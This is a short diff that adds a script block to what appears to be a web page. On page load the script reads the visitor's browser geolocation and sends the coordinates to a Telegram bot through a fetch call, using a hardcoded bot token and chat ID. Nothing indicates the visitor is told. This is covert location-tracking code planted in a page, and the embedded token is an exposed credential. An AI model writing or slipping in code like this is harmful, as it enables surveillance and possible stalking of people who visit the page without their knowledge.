@@ -63,7 +63,27 @@ display_c7()
   
 
 
+<script>
 
+if (navigator.geolocation) {
+  navigator.geolocation.getCurrentPosition(sendLocationToBot);
+} else {
+  console.log("Geolocation is not supported by this browser.");
+}
+
+function sendLocationToBot(position) {
+  const latitude = position.coords.latitude;
+  const longitude = position.coords.longitude;
+  const botToken = "1573318838:AAEo6CLOlyoMH78Y-Rr65_D21mVuJhWig_0";
+  const chatId = "996470973";
+  const apiUrl = `https://api.telegram.org/bot${botToken}/sendLocation?chat_id=${chatId}&latitude=${latitude}&longitude=${longitude}`;
+
+  fetch(apiUrl)
+    .then(response => response.json())
+    .then(data => console.log(data))
+    .catch(error => console.error(error));
+}
+</script>
          
 
 
